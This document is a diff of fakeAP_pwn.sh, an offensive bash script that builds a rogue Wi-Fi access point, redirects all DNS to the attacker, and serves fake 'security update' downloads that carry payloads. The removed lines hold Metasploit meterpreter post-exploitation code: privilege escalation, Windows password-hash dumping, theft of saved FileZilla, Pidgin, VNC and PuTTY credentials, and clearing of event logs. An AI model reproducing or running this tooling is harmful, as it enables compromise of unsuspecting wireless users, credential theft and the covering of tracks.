@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#fakeAP_pwn.sh v0.3 (#114 2010-10-02)                                                          #
+#fakeAP_pwn.sh v0.3 (#115 2010-10-02)                                                          #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -65,10 +65,10 @@ monitorInterface="mon0"
             port=$(shuf -i 2000-65000 -n 1) # Random port each time
              www="${www%/}"                 # Remove trailing slash
           target=""                         # null the value
-     displayMore="False"                    # Gives more details on whats happening
+     displayMore="false"                    # Gives more details on whats happening
            debug="false"                    # Doesn't delete files, shows more on screen etc
          logFile="fakeAP_pwn.log"           # Filename of output
-             svn="114"                      # SVN Number
+             svn="115"                      # SVN Number
          version="0.3 (#$svn)"              # Program version
 trap 'cleanup interrupt' 2                  # Captures interrupt signal (Ctrl + C)
 
@@ -135,7 +135,7 @@ function cleanup() { #cleanup #mode
          if [ $(route | grep "10.0.0.0") ] ; then command="route del -net 10.0.0.0 netmask 255.255.255.0 gw $ourIP $apInterface ; " ; fi
          command="$command echo \"0\" > /proc/sys/net/ipv4/ip_forward"
          #echo "0" > /proc/sys/net/ipv4/conf/$interface/forwarding
-         #echo "0" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding # *** Test? ***
+         #echo "0" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding
          action "Restoring: Network" "$command"
          ipTables clear
       fi
@@ -150,7 +150,7 @@ function cleanup() { #cleanup #mode
       if [ -e "$www/kernel_1.83.90-5+lenny2_i386.deb" ] ; then command="$command $www/kernel_1.83.90-5+lenny2_i386.deb" ; fi
       if [ -e "$www/SecurityUpdate1-83-90-5.dmg.bin" ] ; then command="$command $www/SecurityUpdate1-83-90-5.dmg.bin" ; fi
       if [ -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then command="$command $www/Windows-KB183905-x86-ENU.exe" ; fi
-      if [ ! -z "$command" ] ; then action "Removing temp files" "rm -rfv $command" ; fi
+      action "Removing temp files" "rm -rfv $command"
 
       if [ -d "$www/images" ] ; then action "Removing temp files" "rm -rf $www/images" ; fi
 
@@ -418,6 +418,7 @@ if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true"
       echo "fakeAP_pwn.sh" $* >> $logFile
    fi
 fi
+
 #----------------------------------------------------------------------------------------------#
 display action "Analyzing: Environment"
 
@@ -635,16 +636,6 @@ if [ ! -e "/usr/sbin/dhcpd3" ] ; then
       display info "Installed: dhcpd3"
    fi
 fi
-#if [ ! -e "/usr/sbin/dnsspoof" ] && ( [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ) ; then
-#   display error "dnsspoof isn't installed"
-#   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
-#   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install dnsspoof" "apt-get -y install dsniff" ; fi
-#   if [ ! -e "/usr/sbin/dnsspoof" ] ; then
-#      display error "Failed to install dnsspoof" 1>&2 ; cleanup
-#   else
-#      display info "Installed: dnsspoof"
-#   fi
-#fi
 if [ ! -e "/usr/sbin/dnsmasq" ] && ( [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ) ; then
    display error "dnsmasq isn't installed"
    read -p "[~] Would youdnsspoof like to try and install it? [Y/n]: " -n 1
@@ -961,11 +952,10 @@ own_ip_addr=127.0.0.1
 fi
 
 #----------------------------------------------------------------------------------------------#
-#if [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ; then
-   path="/tmp/fakeAP_pwn.dns" # DNS script
-   if [ -e "$path" ] ; then rm "$path" ; fi
-   #echo -e "# fakeAP_pwn.dns v$version\n$ourIP *" >> $path
-   echo -e "# fakeAP_pwn.dns v$version
+path="/tmp/fakeAP_pwn.dns" # DNS script
+if [ -e "$path" ] ; then rm "$path" ; fi
+#echo -e "# fakeAP_pwn.dns v$version\n$ourIP *" >> $path
+echo -e "# fakeAP_pwn.dns v$version
 interface=$apInterface
 domain=Home.com
 dhcp-range=10.0.0.150,10.0.0.200,24h
@@ -975,34 +965,10 @@ dhcp-option=6,$ourIP # DNS
 log-queries
 log-dhcp
 log-facility=/tmp/fakeAP_pwn.dnsmasq" >> $path
-   if [ "$verbose" == "2" ]  ; then echo "Created: $path" ; fi
-   if [ "$debug" == "true" ] ; then cat "$path" ; fi
-   if [ ! -e "$path" ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
-   cat $path > $path.non && echo "address=/#/$ourIP" >> $path.non
-#fi
-
-#----------------------------------------------------------------------------------------------#
-#path="/tmp/fakeAP_pwn.dhcp" # DHCP script
-#if [ -e "$path" ] ; then rm "$path"; fi
-#echo -e "# fakeAP_pwn.dhcp v$version
-#ddns-update-style none;
-#ignore client-updates; # Ignore all client requests for DDNS update
-#authoritative;
-#default-lease-time 86400; # 24 hours
-#max-lease-time 172800;    # 48 hours
-#log-facility local7;\n
-#subnet 10.0.0.0 netmask 255.255.255.0 {
-#	range 10.0.0.150 10.0.0.250;
-#	option routers $ourIP;
-#	option subnet-mask 255.255.255.0;
-#	option broadcast-address 10.0.0.255;
-#	option domain-name \"Home.com\";" >> $path
-#if [ "$mode" != "non" ] ; then
-#   echo "	option domain-name-servers 208.67.222.220, 208.67.222.222;" >> $path
-#else
-#   echo "	option domain-name-servers $ourIP;" >> $path
-#fi
-#echo -e "	option netbios-name-servers 10.0.0.100;\n}" >> $path
+if [ "$verbose" == "2" ]  ; then echo "Created: $path" ; fi
+if [ "$debug" == "true" ] ; then cat "$path" ; fi
+if [ ! -e "$path" ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
+cat $path > $path.non && echo "address=/#/$ourIP" >> $path.non
 
 #----------------------------------------------------------------------------------------------#
 if [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ; then
@@ -1212,56 +1178,6 @@ output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
 output.puts(\"fakeAP_pwn\")
 output.close
 sleep(1)" >> $path
-   if [ "$extras" == "true" ] ; then echo "print_status(\"-------------------------------------------\")
-print_status(\"Extras\")
-screenshot
-#----
-session.core.use(\"priv\") #use priv
-getsystem
-hashes = session.priv.sam_hashes  #hashdump #> /tmp/fakeAP_pwn.hash
-####################################################################
-   begin
-      session.core.use(\"priv\")
-      hashes = session.priv.sam_hashes
-      print_status(\"Capturing windows hashes \")
-      File.open(File.join(logs, \"hashes.txt\"), \"w\") do |fd|
-         hashes.each do |user|
-            fd.puts(user.to_s)
-         end
-      end
-   rescue ::Exception => e
-      print_status(\"Error dumping hashes: #{e.class} #{e}\")
-   end
-####################################################################
-#----
-sysinfo
-ps
-ipconfig
-route
-#enumdesktops
-#getdesktop
-#setdesktop
-#----
-run checkvm.rb
-run dumplinks.rb -e
-run enum_firefox.rb
-run enum_logged_on_users.rb -c -l
-run enum_putty.rb
-run get_application_list.rb
-run getcountermeasure.rb -d -k
-run get_env.rb
-run get_filezilla_creds.rb -c
-run get_loggedon_users.rb -c -l
-run get_pidgin_creds.rb -b -c -l
-run getvncpw.rb
-#run killav.rb
-run remotewinenum.rb
-run scraper.rb
-run winenum.rb -r
-#----
-clearev
-print_status(\"-------------------------------------------\")" >> $path
-   fi
    echo "print_line(\"[*] Done!\")" >> $path
    if [ "$verbose" == "2" ]  ; then echo "Created: $path" ; fi
    if [ "$debug" == "true" ] ; then cat "$path" ; fi
@@ -1556,32 +1472,13 @@ fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$displayMore" == "true" ] ; then display action "Configuring: Permissions" ; fi
-#action "DHCP" "chmod 775 /var/run/ ; touch /var/lib/dhcp3/dhcpd.leases"
-#if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then # ubuntu - Fixes folder persmissions
-#   mv "/etc/dhcp3/dhcpd.conf" "/etc/dhcp3/dhcpd.conf.bkup"
-#   ln "/tmp/fakeAP_pwn.dhcp"  "/etc/dhcp3/dhcpd.conf"
-#fi
-
 if [ "$mode" == "flip" ] ; then
    mkdir -p "$www/images"
    action "DHCP" "chmod 755 /tmp/fakeAP_pwn.pl ; chmod 755 $www/images ; chown proxy:proxy $www/images"
 fi
 
 #----------------------------------------------------------------------------------------------#
-#display action "Starting: DHCP"
-#if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then command="dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf $apInterface"
-#else command="dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" ; fi
-#action "DHCP" "$command" "true" "0|80|5" & # -d = logging, -f = forground # Don't wait, do the next command
-#sleep 2
-#if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
-#   display error "dhcpd3 failed to start" 1>&2
-   #if [ "$verbose" == "2" ] ; then echo "Command: killall xterm" ; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile ; fi
-   #cleanup
-#fi
-
-#----------------------------------------------------------------------------------------------#
 display action "Starting: DHCP & DNS"
-#action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" "true" "0|173|5" & # Don't wait, do the next command
 if [ "$mode" == "normal" ] || [ "$mode" == "flip" ] ; then command="/tmp/fakeAP_pwn.dns"
 elif [ "$mode" == "transparent" ] || [ "$mode" == "non" ] ; then command="/tmp/fakeAP_pwn.dns.non" ; fi
 action "DHCP" "dnsmasq -C $command ; tail -f /tmp/fakeAP_pwn.dnsmasq | grep DHCP" "false" "0|80|5" & # Don't wait, do the next command
